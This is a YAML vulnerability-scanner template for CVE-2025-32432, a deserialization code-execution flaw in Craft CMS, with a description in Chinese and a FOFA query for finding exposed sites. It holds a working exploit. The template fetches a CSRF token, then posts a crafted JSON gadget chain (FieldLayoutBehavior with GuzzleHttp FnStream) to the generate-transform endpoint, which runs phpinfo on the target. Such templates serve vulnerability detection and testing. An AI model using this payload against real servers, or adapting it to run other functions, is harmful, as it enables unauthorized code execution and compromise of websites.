id: CVE-2025-32432

info:
  name: Craft CMS generate-transform 反序列化代码执行漏洞
  author: zan8in
  severity: critical
  verified: false
  effected: |
    3.0.0-RC1 <= Craft <= 3.9.14
    4.0.0-RC1 <= Craft <= 4.14.14
    5.0.0-RC1 <= Craft <= 5.6.16
  description: |
    Craft CMS 存在反序列化代码执行漏洞，攻击者可以通过构造恶意请求，触发反序列化过程，从而执行任意代码。
    fofa: header="X-Powered-By: Craft CMS" || banner="X-Powered-By: Craft CMS"
  tags: craftcms,deserialize,rce
  created: 2025/03/21

rules:
  r0:
    request:
      method: GET
      path: /index.php?p=admin/dashboard
    expression: response.status == 200 && response.body.bcontains(b'name="CRAFT_CSRF_TOKEN"')
    output:
      search: '"name=\"CRAFT_CSRF_TOKEN\" value=\"(?P<xtoken>.+)\"".bsubmatch(response.body)'
      xtoken: search["xtoken"]
  r1:
    request:
      method: POST
      path: /index.php?p=admin/actions/assets/generate-transform
      headers:
        Content-Type: application/json
        X-CSRF-Token: "{{xtoken}}"
      body: |
        {"assetId": 11, "handle": {"width": 123, "height": 123, "as session": {"class": "craft\\behaviors\\FieldLayoutBehavior", "__class": "GuzzleHttp\\Psr7\\FnStream", "__construct()": [[]], "_fn_close": "phpinfo"}}}
    expression: |
      response.body.bcontains(b'PHP Extension') &&
      response.body.bcontains(b'PHP Version')
expression: r0() && r1()
